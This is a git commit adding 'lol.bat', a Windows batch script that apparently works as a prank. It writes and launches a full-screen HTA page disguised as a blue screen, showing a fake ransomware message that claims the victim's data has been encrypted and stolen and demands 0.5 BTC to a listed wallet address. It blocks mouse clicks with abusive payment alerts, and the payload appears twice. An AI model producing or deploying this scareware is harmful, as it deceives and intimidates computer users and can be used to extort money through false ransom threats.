ecc8d7ebd77c8484f25990fe257ced8bebbd3df3
GhosteDeath <101995937+nrikas@users.noreply.github.com>
2022-05-15 12:47:04 +0100

    fake bsod lol

---
+++ lol.bat
@@ -0,0 +1,117 @@
+@echo off
+
+(
+echo ^<html^>^<head^>^<title^>Microsoft Windows^</title^> 
+echo. 
+echo ^<hta:application id="oBVC" 
+echo applicationname="BSOD"  
+echo version="1.0" 
+echo maximizebutton="no" 
+echo minimizebutton="no" 
+echo sysmenu="no" 
+echo Caption="no" 
+echo windowstate="maximize"/^> 
+echo. 
+echo ^</head^>^<body bgcolor="#000088" scroll="no"^> 
+echo ^<font face="Lucida Console" size="4" color="white"^> 
+echo ^<p^>Your computer been compromised!!!^</p^> 
+echo. 
+echo ^<p^>AI Ransomware^</p^> 
+echo. 
+echo ^<p^>All your data belong to me now :3^</p^> 
+echo. 
+echo ^<p^>Everything been encrypted and all your data been sent to server.^</p^> 
+echo. 
+echo ^<p^>If you don't want all you'r data to be release publicly please pay 0.5BTC  .^</p^> 
+echo. 
+echo ^<h3^>32PgB88RjNtKWRYLEvGLfFos7q5C5zKxE2^</h3^> 
+echo. 
+echo. 
+echo ^<p^>Technical information:^</p^> 
+echo. 
+echo ^<p^>*** STOP: 2x00D1 ^(0x00C,0x002,0x00,0xF86B5A89^)^</p^> 
+echo. 
+echo. 
+echo ^<p^>***  xv3.sys - Address F96B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> 
+echo. 
+echo ^<p^>Beginning dump of physical memory^</p^> 
+echo ^<p^>Physical memory dump complete.^</p^> 
+echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> 
+echo.
+echo. 
+echo ^</font^> 
+echo ^</body^>
+echo.
+echo ^<script language="javascript"^>
+echo function noClick^(^) {
+echo if ^(^(event.button==1^)^|^|^(event.button==2^)^) {
+echo alert^('Error: please make payment or get FUCKED!!!'^)
+echo }
+echo }
+echo document.onmousedown=noClick
+echo ^</script^>
+echo.  
+echo ^</html^> 
+) > bsod.hta 
+
+start "" /wait "bsod.hta"
+
+del /f /q "bsod.hta" > nul
+@echo off
+
+(
+echo ^<html^>^<head^>^<title^>Microsoft Windows^</title^> 
+echo. 
+echo ^<hta:application id="oBVC" 
+echo applicationname="BSOD"  
+echo version="1.0" 
+echo maximizebutton="no" 
+echo minimizebutton="no" 
+echo sysmenu="no" 
+echo Caption="no" 
+echo windowstate="maximize"/^> 
+echo. 
+echo ^</head^>^<body bgcolor="#000088" scroll="no"^> 
+echo ^<font face="Lucida Console" size="4" color="white"^> 
+echo ^<p^>Your computer been compromised!!!^</p^> 
+echo. 
+echo ^<p^>AI Ransomware^</p^> 
+echo. 
+echo ^<p^>All your data belong to me now :3^</p^> 
+echo. 
+echo ^<p^>Everything been encrypted and all your data been sent to server.^</p^> 
+echo. 
+echo ^<p^>If you don't want all you'r data to be release publicly please pay 0.5BTC  .^</p^> 
+echo. 
+echo ^<h3^>32PgB88RjNtKWRYLEvGLfFos7q5C5zKxE2^</h3^> 
+echo. 
+echo ^<p^>Technical information:^</p^> 
+echo. 
+echo ^<p^>*** STOP: 0x00D1 ^(0x00C,0x002,0x00,0xF86B5A89^)^</p^> 
+echo. 
+echo. 
+echo ^<p^>***  gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> 
+echo. 
+echo ^<p^>Beginning dump of physical memory^</p^> 
+echo ^<p^>Physical memory dump complete.^</p^> 
+echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> 
+echo.
+echo. 
+echo ^</font^> 
+echo ^</body^>
+echo.
+echo ^<script language="javascript"^>
+echo function noClick^(^) {
+echo if ^(^(event.button==1^)^|^|^(event.button==2^)^) {
+echo alert^('Error: last chance to make payment'^)
+echo }
+echo }
+echo document.onmousedown=noClick
+echo ^</script^>
+echo.  
+echo ^</html^> 
+) > bsod.hta 
+
+start "" /wait "bsod.hta"
+
+del /f /q "bsod.hta" > nul
